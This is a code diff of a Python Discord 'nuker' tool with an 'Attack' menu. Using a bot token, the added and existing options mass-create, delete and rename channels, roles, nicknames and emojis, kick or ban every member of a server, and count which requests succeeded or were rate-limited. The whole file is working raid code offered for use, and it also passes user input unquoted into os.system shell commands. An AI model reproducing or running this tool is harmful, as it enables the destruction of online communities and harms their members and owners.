@@ -21,9 +21,32 @@ banner="""
 ░░╚██╔╝░░███████╗
 ░░░╚═╝░░░╚══════╝
 """
-version="alpha 1.8 - v2"
+version="alpha 1.9 - v2"
 def printcolor(text):
     print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
+#count sucess and fail
+def countsucessfail():
+    with open("result.log","r") as file:
+            success=0
+            ratelimited=0
+            noperm=0
+            fail=0
+            for line in file:
+                status_code = int(line.strip())
+                if status_code == 201 or status_code==200 or status_code==204:
+                            success += 1
+                elif status_code == 429:
+                    ratelimited += 1
+                elif status_code == 403:
+                    noperm += 1
+                else:
+                    fail +=1
+            file.close()
+            printcolor(f"{success} Requests with success")
+            printcolor(f"{ratelimited} Rate limited")
+            printcolor(f"{fail} Failed")
+            open("result.log","w").write("")
+            time.sleep(1.5)
 #varivbles importants
 guildverified=0
 cango=0
@@ -69,8 +92,14 @@ while True:
 
 #the funcionally nuker 
 while True:
-    cango=0
     count=0
+    repeat=""
+    new=""
+    new1=""
+    api=""
+    cango=""
+    success=0
+    fail=0
     os.system("cls")
     printcolor(banner)
     print()
@@ -80,92 +109,151 @@ while True:
     printcolor("--Attack--")
     printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
     printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename User         [8] Rename Emojis")
+    printcolor("[9] Kick all                [10] Ban all                [11] Unban all")
     print()
     printcolor("--Server Config--")
     cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
     if cmd=="1":
         #create channels
         printcolor("Name of channel:")
-        channelname=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
         printcolor("Channel type:")
         printcolor("text/voice/category")
-        channeltype=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        if channeltype.lower()=="text" or channeltype=="":
-            channeltype=0
+        new1=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        if new1.lower()=="text" or new1=="":
+            new1=0
             cango=1
-        elif channeltype.lower()=="voice":
-            channeltype=2
+        elif new1.lower()=="voice":
+            new1=2
             cango=1
-        elif channeltype.lower()=="category":
-            channeltype=4
+        elif new1.lower()=="category":
+            new1=4
             cango=1
         else:
             print(Colorate.Color(Colors.red,"type of channel incorrect",1))
             time.sleep(3)
-            #creating
+        #creating
         if cango==1:
             printcolor("Amount of channels:")
-            amountchannels=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
-            while count<=amountchannels:
-                os.system(f"start src/createchannel.pyw {guildid} {token} {channeltype} {channelname}")
-                printcolor(f"requested to create {channelname}")
+            repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
+            while count<=repeat:
+                os.system(f"start src/createchannel.pyw {guildid} {token} {new1} {new}")
+                printcolor(f"requested to create {new}")
                 count=count+1
+            printcolor("Finished")
+            time.sleep(1.5)
+            countsucessfail()
     elif cmd=="2":
         #delete channels
-        getchannels = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
-
-        if getchannels.status_code == 200:
-            channels = getchannels.json()
-            for channel in channels:
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
+        if api.status_code == 200:
+            for channel in api.json():
                 printcolor(f"requested to delete {channel['name']}")
                 os.system(f"start src/deletechannel.pyw {token} {channel['id']}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
     elif cmd=="3":
         #role create
         printcolor("Name of role:")
-        rolename=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
         printcolor("Amount of roles:")
-        roleamount=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
-        while count<roleamount:
-            os.system(f"start src/createrole.pyw {guildid} {token} {rolename}")
-            printcolor(f"requested to create {rolename}")
+        repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
+        while count<repeat:
+            os.system(f"start src/createrole.pyw {guildid} {token} {new}")
+            printcolor(f"requested to create {new}")
             count=count+1
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
     elif cmd=="4":
         #role delete
-        rolelist=requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles",headers={"Authorization": f"Bot {token}"})
-        if rolelist.status_code==200:
-            for role in rolelist.json():
+        api=requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles",headers={"Authorization": f"Bot {token}"})
+        if api.status_code==200:
+            for role in api.json():
                 os.system(f"start src/deleteroles.pyw {guildid} {token} {role['id']}")
                 printcolor(f"requested to delete {role['name']}")
                 time.sleep(0.55)
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
     elif cmd=="5":
         #rename channel
         printcolor("New Name:")
-        renamechannel=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        getchannels = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
-        for channel in getchannels.json():
-            printcolor(f"requested channel {channel['name']} rename to {renamechannel}")
-            os.system(f"start src/renamechannels.pyw {channel['id']} {token} {renamechannel}")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
+        for channel in api.json():
+            printcolor(f"requested channel {channel['name']} rename to {new}")
+            os.system(f"start src/renamechannels.pyw {channel['id']} {token} {new}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
     elif cmd=="6":
         #rename role
         printcolor("New Name:")
-        renamerole=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        getroles = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"})
-        for role in getroles.json():
-            printcolor(f"requested role {role['name']} rename to {renamerole}")
-            os.system(f"start src/renameroles.pyw {guildid} {token} {role['id']} {renamerole}")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"})
+        for role in api.json():
+            printcolor(f"requested role {role['name']} rename to {new}")
+            os.system(f"start src/renameroles.pyw {guildid} {token} {role['id']} {new}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
     elif cmd=="7":
         #nick name change
         printcolor("New name:")
-        nicknamechange=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        peoples = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
-        for people in peoples.json():
-            printcolor(f"requested user {people['user']['username']} rename to {nicknamechange}")
-            os.system(f"start src/changenickname.pyw {guildid} {token} {people['user']['id']} {nicknamechange}")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        for people in api.json():
+            printcolor(f"requested user {people['user']['username']} rename to {new}")
+            os.system(f"start src/changenickname.pyw {guildid} {token} {people['user']['id']} {new}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
     elif cmd=="8":
         #emoji name change
         printcolor("New name:")
-        emojichangename=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        emojis = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"})
-        for emoji in emojis.json():
-            printcolor(f"requested change {emoji['name']} rename to {emojichangename}")
-            os.system(f"start src/renameemojis.pyw {guildid} {token} {emoji['id']} {emojichangename}")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"})
+        for emoji in api.json():
+            printcolor(f"requested change {emoji['name']} rename to {new}")
+            os.system(f"start src/renameemojis.pyw {guildid} {token} {emoji['id']} {new}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
+    elif cmd=="9":
+        #kick all
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        for people in api.json():
+            printcolor(f"requested to kick user {people['user']['username']}")
+            os.system(f"start src/kickmember.pyw {guildid} {token} {people['user']['id']}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
+    elif cmd=="10":
+        #ban all
+        printcolor("Ban reason:")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        for people in api.json():
+            printcolor(f"requested to ban user {people['user']['username']}")
+            os.system(f"start src/banmember.pyw {guildid} {token} {people['user']['id']} {new}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
+    elif cmd=="11":
+        #unban all
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/bans", headers={"Authorization": f"Bot {token}"})
+        for people in api.json():
+            printcolor(f"requested to unban user {people['user']['username']}")
+            os.system(f"start src/unbanmember.pyw {guildid} {token} {people['user']['id']}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
+    elif cmd=="serverchangename":
+        printcolor("New server name:")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        os.system(f"start src/changeservername.pyw {guildid} {token} {new}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        countsucessfail()
